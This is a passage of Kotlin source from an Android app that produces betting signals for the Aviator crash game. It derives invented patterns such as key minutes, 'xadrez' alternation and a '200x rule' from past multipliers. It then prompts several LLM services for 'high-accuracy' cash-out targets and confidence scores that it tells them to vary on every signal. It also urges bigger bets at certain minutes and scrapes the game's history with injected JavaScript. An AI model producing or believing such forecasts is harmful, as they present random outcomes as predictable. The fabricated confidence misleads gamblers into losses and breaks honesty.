                    semRosaGrandeUlt10min -> { alcDinamicoMin = 50; alcDinamicoMax = 70 }
                    tendRosas == "CRESCENTE" && ultimasRosas.isNotEmpty() ->
                        { val base = (ultimasRosas.last() * 1.2).toInt(); alcDinamicoMin = base; alcDinamicoMax = (base * 1.15).toInt().coerceAtLeast(base + 2) }
                    tendRosas == "ALTERNADA" && ultimasRosas.isNotEmpty() && ultimasRosas.last() >= 20.0 ->
                        { alcDinamicoMin = 5; alcDinamicoMax = 10 }   // última foi alta → próxima baixa
                    tendRosas == "ALTERNADA" && ultimasRosas.isNotEmpty() && ultimasRosas.last() < 20.0 ->
                        { alcDinamicoMin = 20; alcDinamicoMax = 35 }  // última foi baixa → próxima alta
                    mm5 <= 2.0 -> { alcDinamicoMin = 1; alcDinamicoMax = 3 }
                    mm5 <= 5.0 -> { alcDinamicoMin = 3; alcDinamicoMax = 6 }
                    mm5 <= 10.0 -> { alcDinamicoMin = 5; alcDinamicoMax = 12 }
                    mm5 <= 20.0 -> { alcDinamicoMin = 10; alcDinamicoMax = 20 }
                    mm5 <= 40.0 -> { alcDinamicoMin = 20; alcDinamicoMax = 40 }
                    mm5 <= 80.0 -> { alcDinamicoMin = 40; alcDinamicoMax = 70 }
                    else -> { alcDinamicoMin = 60; alcDinamicoMax = 100 }
                }

                val mediaCasa = mm5
                val saidaConservadora = String.format("%.1f", protDinamica)

                // ── M5: AJUSTAR PARÂMETROS SE MODO CONSERVADOR ACTIVO ────────
                val protFinal = if (modoConservadorAtivo) protDinamica.coerceAtLeast(1.5) else protDinamica
                val alcMinFinal = if (modoConservadorAtivo) alcDinamicoMin.coerceAtMost(5) else alcDinamicoMin
                val alcMaxFinal = if (modoConservadorAtivo) alcDinamicoMax.coerceAtMost(8) else alcDinamicoMax
                val avisoConservador = if (modoConservadorAtivo)
                    "\n⚠️ MODO CONSERVADOR ACTIVO: mais de 60% das últimas 10 velas foram azuis. Reduz parâmetros." else ""

                // ── Minutos chave ─────────────────────────────────────
                val minutosChave = setOf(57,58,59,1,2,3,20,21,22,29,30,31,40,41,42,45,46,47,50,51,52)
                val estaEmMinutoChave = minAgora in minutosChave
                val proxMinChave = minutosChave.map { m -> val d = m - minAgora; if (d < 0) d + 60 else d }.minOrNull() ?: 0

                // ── Probabilidade empírica ────────────────────────────
                val probAlta = ((roxas + rosas).toDouble() / n * 100).toInt()

                // ── Altura das rosas ──────────────────────────────────
                val zonaAltura = when {
                    ultimasRosas.isEmpty() -> "indeterminada"
                    ultimasRosas.last() < 15.0 -> "10x-15x (baixa)"
                    ultimasRosas.last() < 30.0 -> "15x-30x (media)"
                    ultimasRosas.last() < 80.0 -> "30x-80x (alta)"
                    else -> "80x+ (muito alta)"
                }

                val seqStr = velasParaAnalise.takeLast(15)
                    .joinToString("→") { if (it >= 10.0) "ROSA" else if (it >= 2.0) "ROXA" else "AZUL" }

                // ── Xadrez de alcance — análise profunda com cores ───
                val xadrezRosasEmoji = rosasXadrezAlcance.joinToString(" → ") { v ->
                    when {
                        v >= 50.0 -> "🟣${String.format("%.0f",v)}x"
                        v >= 20.0 -> "🩷${String.format("%.0f",v)}x(ALTA)"
                        else      -> "💗${String.format("%.0f",v)}x(baixa)"
                    }
                }
                // Contagem de alternâncias entre alta/baixa nas rosas
                val rosasSeq = rosasXadrezAlcance
                var altRosas = 0
                for (i in 1 until rosasSeq.size) {
                    val prevAlta = rosasSeq[i-1] >= 20.0
                    val currAlta = rosasSeq[i] >= 20.0
                    if (prevAlta != currAlta) altRosas++
                }
                // Tendência das últimas 3 rosas
                val ultimas3Rosas = rosasXadrezAlcance.takeLast(3)
                val tendUlt3 = when {
                    ultimas3Rosas.size < 2 -> "INSUFICIENTE"
                    ultimas3Rosas.zipWithNext().all { (a,b) -> b > a } -> "SUBINDO"
                    ultimas3Rosas.zipWithNext().all { (a,b) -> b < a } -> "DESCENDO"
                    else -> "ALTERNADA"
                }
                val xadrezProxima = if (xadrezAlcanceAlto) "ALTA>=20x alc=${alcDinamicoMin}x-${alcDinamicoMax}x" else "BAIXA<20x alc=${alcDinamicoMin}x-${alcDinamicoMax}x"
                val xadrezAlcStr = if (xadrezAlcanceActivo)
                    "ACTIVO(alt=$altRosas) PROXIMA:$xadrezProxima | rosas:$xadrezRosasEmoji | tend:$tendUlt3"
                else if (rosasXadrezAlcance.size >= 2)
                    "NAO activo | rosas:$xadrezRosasEmoji | tend:$tendUlt3"
                else "NAO detectado (poucas rosas)"

                // ── Regra 200x ────────────────────────────────────────
                val regra200Str = if (houveMega200xRecente)
                    "ACTIVA — saiu 200x+! Faltam $rosasMega200xRestantes rosas para aparecer uma >=70x. AUMENTAR ALCANCE."
                else "NAO activa"

                // ── Regra últimos 10 min da hora ─────────────────────
                val regra10minStr = if (semRosaGrandeUlt10min)
                    "ACTIVA — sem rosa >=50x nos ultimos 10min da hora! No inicio da hora seguinte pode surgir rosa >=70x."
                else if (minAgora >= 50)
                    "ALERTA — estamos nos ultimos ${60 - minAgora} min da hora. Monitorar se nenhuma rosa >=50x aparecer."
                else "NAO activa (min=$minAgora)"

                val prompt = """
Es um analisador especializado do jogo Aviator (Spribe). Aplica TODOS os metodos ao historico e calcula o melhor sinal com ALTA ASSERTIVIDADE.
$avisoConservador
HISTORICO REAL (${velasParaAnalise.size} rondas, mais antiga → mais recente):
[${historico}]

SEQUENCIA ZONAS (ultimas 15 com cores): ${seqStr}

ESTATISTICAS PRE-CALCULADAS:
- Media: ${String.format("%.2f", media)}x | Mediana: ${String.format("%.2f", mediana)}x | Max: ${String.format("%.2f", maxGeral)}x
- MM5: ${String.format("%.2f", mm5)}x | MM10: ${String.format("%.2f", mm10)}x | Slope: $slopeDir(${String.format("%.3f", slope)})
- DesvioPad: ${String.format("%.2f", stdDev)} | CV: ${String.format("%.1f", cv)}%
- Dist: 🔵$azuis azuis(${if(n>0)(azuis*100/n) else 0}%) | ⚪$roxas roxas(${if(n>0)(roxas*100/n) else 0}%) | 🩷$rosas rosas(${if(n>0)(rosas*100/n) else 0}%) | 🟣$megas megas(${if(n>0)(megas*100/n) else 0}%)
- Outliers: ${outliers.size} ${if (outliers.isNotEmpty()) "(${outliers.take(3).joinToString(",") { String.format("%.0f",it)+"x" }})" else ""}
- Prob>=2x: ${probAlta}%

SINAL BASE PRE-CALCULADO (afina se necessário, mas respeita a lógica abaixo):
- Protecao sugerida: ${String.format("%.1f", protFinal)}x
- Alcance sugerido: ${alcMinFinal}x → ${alcMaxFinal}x
- Minuto quente (histórico de rosas ≥10x neste minuto): ${if (contagemMinutos[minAgora] >= 2) "SIM (${contagemMinutos[minAgora]} vezes)" else "NAO"}

PADROES DETECTADOS:
- Seq.Azuis(fim): $seqAzuis ${if(seqAzuis>=3)"⚠ COMBOIO DE AZUIS — NAO ENTRAR" else "OK"}
- Seq.Altas(fim): $seqAltas ${if(seqAltas>=3)"⚠ possivel recolhimento" else ""}
- XADREZ intercalacao: ${if(xadrezAtivo)"ACTIVO(alt=$alternancia)→ROSA ESPERADA" else "NAO"}
- XADREZ ALCANCE: $xadrezAlcStr
- REPETICAO: ${if(padraoRep)"CONFIRMADO $ultimasCasas casas entre rosas" else "NAO"} | $casasDesdeUltimaRosa casas desde ultima rosa
- ESPELHO: ${if(espelhoDetectado)"DETECTADO(sz=$espelhoTam)" else "NAO"}
- ROXO PAGANTE: ${if(roxoPagante)"ACTIVO→entrar 2x" else "NAO"}
- Tend.Rosas: $tendRosas ${if(ultimasRosas.isNotEmpty())"(${ultimasRosas.takeLast(4).joinToString("→"){ v -> val emoji = if(v>=50.0)"🟣" else "🩷"; "$emoji${String.format("%.0f",v)}x"}})" else ""}
- Altura zona: $zonaAltura
- Velas esp.(azuis→rosa): [${velaAvantesRosa.joinToString(",")}]
- REGRA 200x: $regra200Str
- REGRA 10MIN HORA: $regra10minStr
- Minuto: $minAgora ${if(estaEmMinutoChave)"✅CHAVE!" else "(prox.chave ~${proxMinChave}min)"}
- Hora: ${horaAgora}h ${if(horaAgora in 5..11)"OURO" else "normal"}

REGRAS CRITICAS OBRIGATORIAS:

⚠ CATEGORIAS: 🔵 AZUL <2x | ⚪ ROXA 2x-9.99x | 🩷 ROSA 10x-49x | 🟣 MEGA >=50x

⚠ REGRA FUNDAMENTAL — PROTECAO vs ALCANCE:
A PROTECAO e SEMPRE muito menor que o ALCANCE. Exemplos corretos:
- Prot=1.5x, Alc=10x-20x ✅ | Prot=2x, Alc=15x-30x ✅ | Prot=3x, Alc=20x-50x ✅
- Prot=2x, Alc=4x ✅(conservador) | Prot=5x, Alc=30x ✅ | Prot=10x, Alc=80x ✅ | Prot=20x, Alc=100x ✅
- Prot=10x, Alc=10x ❌ERRADO | Prot=4x, Alc=4x ❌ERRADO
A protecao e o ponto de saida SEGURO (~15-20% do alcance esperado). O alcance e o OBJETIVO ambicioso.
NUNCA coloque protecao igual ou proxima ao alcance! Protecao pode ir ate 20x se o alcance for alto (>=100x).
Apos uma vela muito alta (>=50x), a protecao SOBE: usa prot=3x-10x para as proximas rondas.

R1 — COMBOIO DE AZUIS: seqAzuis=$seqAzuis. ${if(seqAzuis>=5)"CRITICO: prot=1.1x, alc_max=2x" else if(seqAzuis>=3)"COMBOIO: NAO ENTRAR: prot=1.2x, alc conservador 2x-3x" else "Normal."}

R2 — XADREZ intercalacao: ${if(xadrezAtivo)"prot=MM5(${String.format("%.1f",mm5)}x), alc=10x-30x (rosa esperada)" else "N/A"}

R3 — XADREZ ALCANCE: ${if(xadrezAlcanceActivo)"proxima rosa ${if(xadrezAlcanceAlto)"ALTA>=20x🟣→alc_max=50x" else "BAIXA<20x🩷→alc_max=15x"} | padrão: ${rosasXadrezAlcance.joinToString("→"){ v -> if(v>=50.0)"🟣${String.format("%.0f",v)}x" else "🩷${String.format("%.0f",v)}x"}}" else "N/A"}

R4 — REGRA 200x+: ${if(houveMega200xRecente)"ACTIVA! Nas proximas $rosasMega200xRestantes rosas uma sera >=70x! alc_max=100x, prot=2x-3x" else "N/A"}

R5 — REGRA 10MIN HORA: ${if(semRosaGrandeUlt10min)"ACTIVA! No inicio da hora seguinte pode aparecer rosa >=70x. alc_max=80x" else "N/A"}

R6 — REPETICAO: ${if(padraoRep)"prot=1.5x-2x, alc= zona das rosas anteriores(${if(ultimasRosas.isNotEmpty()) String.format("%.0f",ultimasRosas.average())+"x media" else "?"})" else "N/A"}

R7 — ROXO PAGANTE: ${if(roxoPagante)"prot=1.5x, alc_max=3x" else "N/A"}

R8 — MEDIA CASA: MM5=${String.format("%.1f",mm5)}x MM10=${String.format("%.1f",mm10)}x. ${
    if(mm5<=2.5) "Mercado muito azul: protecao baixa 1.1x-1.5x, alcance moderado 8x-20x"
    else if(mm5<=6.0) "Mercado misto: protecao 2x-3x, alcance segue as rosas recentes"
    else if(mm5<=20.0) "Mercado activo: protecao 3x-5x, alcance baseado nas ultimas rosas (nao limitar a 15x)"
    else "Mercado explosivo (mm5=${String.format("%.0f",mm5)}x): protecao 5x-15x, alcance alto >= 50x"
}

R9 — ALTURA ROSAS: $tendRosas. ${when(tendRosas){
    "CRESCENTE"->"proxima rosa > ultima(${if(ultimasRosas.isNotEmpty())String.format("%.0f",ultimasRosas.last())+"x" else "?"}) → aumentar alcance"
    "DECRESCENTE"->"proxima rosa < ultima → diminuir alcance"
    "ALTERNADA"->"ultima foi ${if(ultimasRosas.isNotEmpty()&&ultimasRosas.last()>=20.0)"ALTA→proxima BAIXA<20x" else "BAIXA→proxima ALTA>=20x"}"
    else->"insuficiente"
}}

R10 — MINUTAGEM: ${if(estaEmMinutoChave)"MINUTO CHAVE($minAgora)→aumentar aposta, rosas grandes 57-59/01-03" else "normal"}

R11 — ESTATISTICA: Apos outlier ${if(outliers.isNotEmpty())"(${String.format("%.0f",outliers.last())}x recente)" else "(nenhum)"}: retorno a azuis por 2-5 rondas. NUNCA Martingale.

CALCULA e responde APENAS com JSON puro (sem texto, sem markdown, sem explicacoes).

{"protecao":NUMERO,"alcance_min":NUMERO,"alcance_max":"NUMEROx","tendencia":"SUBIDA|QUEDA|LATERAL","confianca":PERCENTAGEM,"min_entrada":MINUTO}

REGRAS DO JSON — lê os dados reais, nao uses valores fixos:

- protecao: numero real, sempre ~15% do alcance_max esperado. Exemplos:
  alc~10x → prot=1.5x | alc~20x → prot=2.5x | alc~50x → prot=5x | alc~100x → prot=10x
  Comboio azuis → prot=1.1x-1.3x. Pos-200x → prot=5x-8x.
  NUNCA igual nem proxima ao alcance.

- alcance_min: minimo realista baseado nas ultimas rosas do historico.
  Se ultimasRosas media < 15x → usa metade da media. Se media >= 15x → usa 10x-20x.
  Se ha rosas recentes >= 50x → usa 20x-40x como minimo. Varia sempre com os dados.

- alcance_max: OBJECTIVO AMBICIOSO baseado nos dados REAIS. Raciocina assim:
  1. Qual foi a maior rosa recente? (max das ultimas 5 rosas)
  2. A tendencia e crescente, decrescente ou alternada?
  3. Ha padroes activos (xadrez, 200x, repeticao, minuto chave)?
  Com base nisso escolhe um alcance que faca sentido para ESTE momento especifico.
  NAO uses intervalos fixos como "20x-50x" — usa o historico real.
  Exemplos guia (nao copiar cegamente):
  Todas as velas < 3x, sem padrao → 8x a 20x
  Mistura de azuis e roxas, tendencia neutra → 15x a 35x
  Rosas recentes de 15x-40x → 30x a 60x
  Rosa recente de 80x+ ou regra 200x activa → 80x a 200x
  Mercado explosivo (mm5 > 30x) → 100x a 500x
  Varia o valor a cada sinal — NUNCA repitas o mesmo alcance_max consecutivamente.

- tendencia: SUBIDA se slope positivo e mm5>mm10 | QUEDA se slope negativo | LATERAL caso contrario.

- confianca: honesta e variada. Base = 50%. Adiciona:
  +15% se xadrez activo | +10% se repeticao confirmada | +10% se minuto chave
  +10% se regra 200x activa | -15% se comboio azuis | -10% se mercado instavel (CV>150%)
  Resultado entre 30% e 95%. NUNCA uses sempre o mesmo valor.

- min_entrada: minuto entre $minAgora+1 e $minAgora+4 baseado nos padroes de repeticao e minutagem.
                """.trimIndent()

                val bodyJson = "{\"model\":\"$OR_MODEL\"," +
                    "\"messages\":[{\"role\":\"user\",\"content\":${escapeJson(prompt)}}]," +
                    "\"max_tokens\":250,\"temperature\":0.9}"

                val dsBodyJson = "{\"model\":\"$DS_MODEL\"," +
                    "\"messages\":[{\"role\":\"user\",\"content\":${escapeJson(prompt)}}]," +
                    "\"max_tokens\":250,\"temperature\":0.9}"

                // ── 1.º OR key1 → 2.º OR key2 → 3.º Gemini → 4.º DeepSeek ─────────
                val (code, resp) = chamarIaApi(OR_URL, OR_KEY, bodyJson)
                if (code in 200..299) {
                    iaTimeoutRunnable?.let { handler.removeCallbacks(it) }; iaTimeoutRunnable = null
                    cacheResultadoIA = resp; cacheNumVelas = historicoVelas.size
                    cacheTimestampMs = System.currentTimeMillis()
                    consecutivosFalhosIA = 0; runOnUiThread { resetarRetryIA() }
                    processarRespostaGroq(resp, minAgora)
                } else {
                    runOnUiThread { setBarra("🔄 OR KEY1 FALHOU", "A tentar chave 2...", "#f59e0b") }
                    val (code2, resp2) = chamarIaApi(OR_URL, OR_KEY2, bodyJson)
                    if (code2 in 200..299) {
                        iaTimeoutRunnable?.let { handler.removeCallbacks(it) }; iaTimeoutRunnable = null
                        cacheResultadoIA = resp2; cacheNumVelas = historicoVelas.size
                        cacheTimestampMs = System.currentTimeMillis()
                        consecutivosFalhosIA = 0; runOnUiThread { resetarRetryIA() }
                        processarRespostaGroq(resp2, minAgora)
                    } else {
                    runOnUiThread { setBarra("🔄 OR KEY2 FALHOU", "A tentar Gemini...", "#f59e0b") }
                    val (codeG, respG) = chamarGemini(prompt)

                    if (codeG in 200..299) {
                        iaTimeoutRunnable?.let { handler.removeCallbacks(it) }; iaTimeoutRunnable = null
                        cacheResultadoIA = respG
                        cacheNumVelas = historicoVelas.size
                        cacheTimestampMs = System.currentTimeMillis()
                        consecutivosFalhosIA = 0
                        runOnUiThread { resetarRetryIA() }
                        processarRespostaGroq(respG, minAgora)

                    } else {
                        runOnUiThread { setBarra("🔄 GEMINI FALHOU", "A tentar DeepSeek...", "#f59e0b") }
                        val (codeDS, respDS) = chamarIaApi(DS_URL, DS_KEY, dsBodyJson)

                        if (codeDS in 200..299) {
                            iaTimeoutRunnable?.let { handler.removeCallbacks(it) }; iaTimeoutRunnable = null
                            cacheResultadoIA = respDS
                            cacheNumVelas = historicoVelas.size
                            cacheTimestampMs = System.currentTimeMillis()
                            consecutivosFalhosIA = 0
                            runOnUiThread { resetarRetryIA() }
                            processarRespostaGroq(respDS, minAgora)

                        } else if (code2 == 429 || code == 429) {
                        // Rate limit — aguardar 45s
                        iaTimeoutRunnable?.let { handler.removeCallbacks(it) }; iaTimeoutRunnable = null
                        consecutivosFalhosIA++
                        val sinalOffline429 = gerarSinalOffline()
                        runOnUiThread {
                            analisandoIA = false
                            cicloAtivo = false
                            janelaJaDisparou = false
                            ultimaAnaliseMs = System.currentTimeMillis()
                            velasDesdeUltimaAnalise = 0
                            countdown429Job?.let { handler.removeCallbacks(it) }
                            countdown429Job = null
                            emitirSinalOffline(sinalOffline429)
                            var seg = 45
                            val job = object : Runnable {
                                override fun run() {
                                    if (analisandoIA || seg <= 0) { countdown429Job = null; return }
                                    txtMinutos.text = "⏳ ${seg}s"
                                    txtMinutos.setTextColor(Color.parseColor("#f59e0b"))
                                    seg--
                                    handler.postDelayed(this, 1000)
                                }
                            }
                            countdown429Job = job
                            handler.post(job)
                            handler.postDelayed({
                                countdown429Job = null
                                if (!analisandoIA) pedirSinalIA()
                            }, 45_000L)
                        }
                        } else {
                        // Todos falharam — sinal offline
                        iaTimeoutRunnable?.let { handler.removeCallbacks(it) }; iaTimeoutRunnable = null
                        consecutivosFalhosIA++
                        val sinalOfflineGenerico = gerarSinalOffline()
                        runOnUiThread {
                            analisandoIA = false
                            cicloAtivo = false
                            janelaJaDisparou = false
                            emitirSinalOffline(sinalOfflineGenerico)
                            if (consecutivosFalhosIA == 1) {
                                AlertDialog.Builder(this@MainActivity)
                                    .setTitle("⚠️ Todos os providers falharam")
                                    .setMessage("OR key1 ($code), OR key2 ($code2), Gemini ($codeG), DeepSeek ($codeDS) falharam.\n\nA usar sinal offline baseado em regras locais.")
                                    .setPositiveButton("OK") { d, _ -> d.dismiss() }
                                    .show()
                            }
                        }
                        }
                    }
                    } // fim else OR key2
                } // fim else OR key1
            } catch (e: Exception) {
                iaTimeoutRunnable?.let { handler.removeCallbacks(it) }; iaTimeoutRunnable = null
                consecutivosFalhosIA++
                val sinalOfflineExc = gerarSinalOffline()
                runOnUiThread {
                    analisandoIA = false
                    cicloAtivo = false
                    janelaJaDisparou = false
                    emitirSinalOffline(sinalOfflineExc)
                }
            }
        }.start()
    }

    private fun processarRespostaGroq(resposta: String, minAgora: Int) {
        try {
            var textoIA = ""
            val contentIdx = resposta.indexOf(""""content":""")
            if (contentIdx >= 0) {
                var pos = contentIdx + 10
                while (pos < resposta.length && (resposta[pos] == ' ' || resposta[pos] == ':')) pos++
                if (pos < resposta.length && resposta[pos] == '"') {
                    pos++
                    val sb = StringBuilder()
                    while (pos < resposta.length) {
                        val c = resposta[pos]
                        if (c == '\\') {
                            pos++
                            when (resposta.getOrNull(pos)) {
                                'n'  -> sb.append('\n')
                                'r'  -> sb.append('\r')
                                't'  -> sb.append('\t')
                                '"'  -> sb.append('"')
                                '\\' -> sb.append('\\')
                                else -> { sb.append('\\'); sb.append(resposta.getOrNull(pos) ?: "") }
                            }
                        } else if (c == '"') {
                            break
                        } else {
                            sb.append(c)
                        }
                        pos++
                    }
                    textoIA = sb.toString()
                }
            }

            if (textoIA.isEmpty()) {
                runOnUiThread {
                    analisandoIA = false
                    setBarra("🔄 SEM RESPOSTA", "A tentar de novo em 15s...", "#f59e0b")
                    handler.postDelayed({
                        if (!analisandoIA && historicoVelas.size >= MIN_VELAS_ANALISE) {
                            invalidarCache(); pedirSinalIA()
                        }
                    }, 15_000L)
                }
                return
            }

            val prot   = Regex(""""?protecao"?\s*:\s*([\d.]+)""").find(textoIA)?.groupValues?.get(1)?.toFloatOrNull()?.coerceIn(1.05f, 10f) ?: 0f
            val alcMin = Regex(""""?alcance_min"?\s*:\s*(\d+)""").find(textoIA)?.groupValues?.get(1)?.toIntOrNull() ?: 0
            val alcMaxRaw = Regex(""""?alcance_max"?\s*:\s*"?([\d]+x?)"?""").find(textoIA)?.groupValues?.get(1) ?: ""
            val tendencia = Regex(""""?tendencia"?\s*:\s*"?([^",}\n]+)"?""").find(textoIA)?.groupValues?.get(1)?.trim() ?: ""
            val confianca = Regex(""""?confianca"?\s*:\s*(\d+)""").find(textoIA)?.groupValues?.get(1)?.toIntOrNull() ?: 0
            // intervalo_min removido — ciclo agora é pelo fim da janela (verificarRelogio)
            val minEntradaIA = Regex(""""?min_entrada"?\s*:\s*(\d+)""").find(textoIA)?.groupValues?.get(1)?.toIntOrNull() ?: -1

            if (prot == 0f || alcMin == 0 || alcMaxRaw.isEmpty()) {
                runOnUiThread {
                    analisandoIA = false
                    // Mostrar o texto recebido para debug
                    val debugTxt = textoIA.take(60).ifEmpty { "vazio" }
                    setBarra("🔄 ERRO JSON", debugTxt, "#f59e0b")
                    handler.postDelayed({
                        if (!analisandoIA && historicoVelas.size >= MIN_VELAS_ANALISE) {
                            invalidarCache()
                            modoSilenciosoAtivo = false
                            pedirSinalIA()
                        }
                    }, 10_000L)
                }
                return
            }

            val alcMaxNum = alcMaxRaw.replace(Regex("[^0-9]"), "").toIntOrNull() ?: 0

            // ── VALIDAÇÃO CRÍTICA: proteção NUNCA pode ser >= alcance ──────────
            // Proteção é sempre o ponto de saída seguro (muito menor que o alcance)
            // ── Alcance máximo: mínimo 9x ──
            val alcMaxNumCorrigido = alcMaxNum.coerceAtLeast(9)
            val alcMaxFinal = "${alcMaxNumCorrigido}x"

            val protCorrigida = when {
                // Proteção >= alcance: erro crítico → forçar para 20% do alcance
                prot >= alcMaxNumCorrigido.toFloat() -> (alcMaxNumCorrigido * 0.2f).coerceAtLeast(1.3f)
                // Proteção > metade do alcance: ainda muito próxima → forçar para 25%
                prot > alcMaxNumCorrigido.toFloat() / 2f -> (alcMaxNumCorrigido.toFloat() * 0.25f).coerceAtLeast(1.3f)
                // Proteção > 1/3 do alcance → ajustar para 1/4
                prot > alcMaxNumCorrigido.toFloat() / 3f -> (alcMaxNumCorrigido.toFloat() / 4f).coerceAtLeast(1.3f)
                // Proteção OK
                else -> prot
            }

            // Alcance mínimo: 9x, e sempre pelo menos 3x a proteção
            val alcMinCorrigido = alcMin.coerceAtLeast(9).coerceAtLeast((protCorrigida * 3f).toInt())

            val alcMax = alcMaxFinal
            sinalProtecao = if (protCorrigida % 1f == 0f) "${protCorrigida.toInt()}x" else "${String.format("%.1f", protCorrigida)}x"
            sinalAlcMin   = alcMinCorrigido
            sinalAlcMax   = alcMax
            sinalTendencia = tendencia
            sinalConfianca = confianca
            // Janela fixa: calculada 1 única vez aqui, nunca modificada até novo sinal
            // min_entrada da IA deve estar 1 a 5 minutos à frente do minuto actual
            val distancia = if (minEntradaIA >= 0) (minEntradaIA - minAgora + 60) % 60 else -1
            sinalMinEntrada = if (distancia in 1..5) minEntradaIA else (minAgora + 1) % 60
            sinalMinSaida   = (sinalMinEntrada + 1) % 60
            horaAtual     = Calendar.getInstance().get(Calendar.HOUR_OF_DAY)

            val alcNum = alcMaxRaw.replace(Regex("[^0-9]"), "").toIntOrNull() ?: 0
            val cor = when {
                alcNum >= 50  -> "#f0abfc"  // mega
                alcNum >= 20  -> "#ec4899"  // rosa grande
                alcNum >= 10  -> "#22c55e"  // rosa
                alcNum >= 5   -> "#f59e0b"  // moderado
                else          -> "#3b82f6"  // conservador
            }

            runOnUiThread {
                countdown429Job?.let { handler.removeCallbacks(it) }
                countdown429Job = null
                // Cancelar qualquer ciclo anterior antes de mostrar novo sinal
                proximaAnaliseRunnable?.let { handler.removeCallbacks(it) }
                proximaAnaliseRunnable = null
                cicloAtivo = false
                janelaJaDisparou = false   // reset: janela nova, ainda não disparou
                sinaisAtivos = true
                analisandoIA = false
                ultimaAnaliseMs = System.currentTimeMillis()
                velasDesdeUltimaAnalise = 0

                // M6: guardar sinal no histórico para comparação com crash real
                val alcMaxNumParaHistorico = alcMax.replace(Regex("[^0-9]"), "").toIntOrNull() ?: 0
                val novoSinal = SinalRegistado(
                    timestampMs = System.currentTimeMillis(),
                    protecao = protCorrigida.toDouble(),
                    alcanceMin = alcMinCorrigido,
                    alcanceMax = alcMaxNumParaHistorico,
                    confianca = confianca
                )
                if (historicoSinais.size >= 10) historicoSinais.removeAt(0)
                historicoSinais.add(novoSinal)
                sinalPendenteComparacao = novoSinal

                // M9: persistir sinal para restaurar após kill do processo
                guardarSinalEstado(protCorrigida.toDouble(), alcMinCorrigido.toDouble(),
                    alcMaxNumParaHistorico.toDouble(), confianca, tendencia)

                // M4: vibrar + som ao emitir novo sinal
                dispararAlertaSinal()

                mostrarSinalCompleto(sinalProtecao, "${sinalAlcMin}x → $sinalAlcMax", tendencia, confianca, cor, minAgora)

                // M10: actualizar barra visual de confiança
                actualizarBarraConfianca(confianca)

                if (relogioRunnable == null) iniciarRelogio()
                // O próximo sinal é agendado pelo verificarRelogio quando sinalMinSaida termina
            }
        } catch (e: Exception) {
            runOnUiThread {
                analisandoIA = false
                setBarra("🔄 ERRO IA", "A tentar de novo em 15s...", "#f59e0b")
                handler.postDelayed({
                    if (!analisandoIA && historicoVelas.size >= MIN_VELAS_ANALISE) {
                        invalidarCache(); pedirSinalIA()
                    }
                }, 15_000L)
            }
        }
    }

    // ── Actualizar linha de bolinhas ─────────────────────────────
    // ── Banner de avisos/alertas — actualiza após cada crash ─────
    private fun atualizarAviso() {
        if (!::txtAviso.isInitialized) return
        val n = historicoVelas.size
        val seqAzuis = historicoVelas.reversed().takeWhile { it < 2.0 }.size
        val cal = Calendar.getInstance()
        val minAgora = cal.get(Calendar.MINUTE)

        val (msg, bgHex, txtHex, borderHex) = when {
            // 1 — Comboio crítico (≥5 azuis) — NÃO ENTRAR
            seqAzuis >= 5 ->
                arrayOf("🔵 COMBOIO DE AZUIS CRÍTICO ($seqAzuis seguidos) — NÃO ENTRAR", "#1c0a0a", "#fca5a5", "#7f1d1d")
            // 2 — Comboio moderado (3-4 azuis) — CUIDADO
            seqAzuis >= 3 ->
                arrayOf("🔵 COMBOIO DE AZUIS ($seqAzuis seguidos) — CUIDADO", "#1c1208", "#fde68a", "#78350f")
            // 3 — Pós-mega 200x — rosa grande esperada
            houveMega200xRecente ->
                arrayOf("🟣 PÓS-MEGA 200x — rosa ≥70x esperada em ${rosasMega200xRestantes} rondas", "#0d0a1e", "#c4b5fd", "#4c1d95")
            // Sem alerta sério → esconder banner
            else -> arrayOf("", "", "", "")
        }

        runOnUiThread {
            if (msg.isEmpty()) {
                txtAviso.visibility = View.GONE
            } else {
                txtAviso.text = msg
                txtAviso.setTextColor(Color.parseColor(txtHex))
                txtAviso.background = GradientDrawable().apply {
                    shape = GradientDrawable.RECTANGLE
                    cornerRadius = dp(6).toFloat()
                    setColor(Color.parseColor(bgHex))
                    setStroke(dp(1), Color.parseColor(borderHex))
                }
                txtAviso.visibility = View.VISIBLE
            }
        }
    }

    // ── CICLO: função mantida só para compatibilidade (não mais usada para ciclo principal) ──
    // O ciclo principal é agora gerido por verificarRelogio() com base no sinalMinSaida
    private fun agendarProximaAnalise(@Suppress("UNUSED_PARAMETER") intervaloMinutos: Int) {
        // Não fazer nada — o ciclo é gerido pelo verificarRelogio
    }

    // ── JS: ler histórico visível no gráfico do Aviator ──────────
    private fun injetarJsLerHistorico() {
        val js = """
(function() {
    if (window._histLido) return;
    var tentativas = 0;
    var MAX_TENT = 20;   // tentar até 20s

    function extrairDeDoc(doc) {
        if (!doc || !doc.body) return [];
        var vals = [];
        var vistos = {};
        // Padrão exacto do Aviator: "1.84x", "41.49x", "200.00x"
        var padrao = /^(\d{1,6}\.\d{2})x?$/i;
        // Varrer todos os nós de texto
        try {
            var walker = doc.createTreeWalker(doc.body, 4 /*NodeFilter.SHOW_TEXT*/, null, false);
            var node;
            while ((node = walker.nextNode())) {
                var t = node.textContent.trim();
                var m = t.match(padrao);
                if (m) {
                    var n = parseFloat(m[1]);
                    if (n >= 1.0 && n <= 200000.0 && !vistos[m[1]]) {
                        vistos[m[1]] = true;
                        vals.push(n);
                    }
                }
            }
        } catch(e) {}
        return vals;
    }

    function tentar() {
        tentativas++;
        var todos = [];

        // Documento principal
        extrairDeDoc(document).forEach(function(v) { todos.push(v); });

        // Iframes (o jogo pode estar num iframe)
        try {
            document.querySelectorAll('iframe').forEach(function(fr) {
                try {
                    var d = fr.contentDocument || fr.contentWindow.document;
                    extrairDeDoc(d).forEach(function(v) { todos.push(v); });
                    // Iframes dentro de iframes
                    d.querySelectorAll('iframe').forEach(function(fr2) {
                        try {
                            var d2 = fr2.contentDocument || fr2.contentWindow.document;
                            extrairDeDoc(d2).forEach(function(v) { todos.push(v); });
                        } catch(e2) {}
                    });
                } catch(e1) {}
            });
        } catch(e) {}

        // Deduplica mantendo ordem (o histórico vem mais recente→antigo, inverter para antigo→recente)
        var dedup = [];
        var vistosN = {};
        todos.forEach(function(n) {
            var k = n.toFixed(2);
            if (!vistosN[k]) { vistosN[k] = true; dedup.push(n); }
        });

        if (dedup.length >= 5) {
            window._histLido = true;
            // Histórico do jogo: mais recente primeiro → inverter para cronológico
            dedup.reverse();
            try { Android.velasHistoricoRecebidas('[' + dedup.join(',') + ']'); } catch(e) {}
            try { top.Android && top.Android.velasHistoricoRecebidas('[' + dedup.join(',') + ']'); } catch(e) {}
        } else if (tentativas < MAX_TENT) {
            setTimeout(tentar, 1000);
        } else {
            // Desistiu — usar fallback Supabase
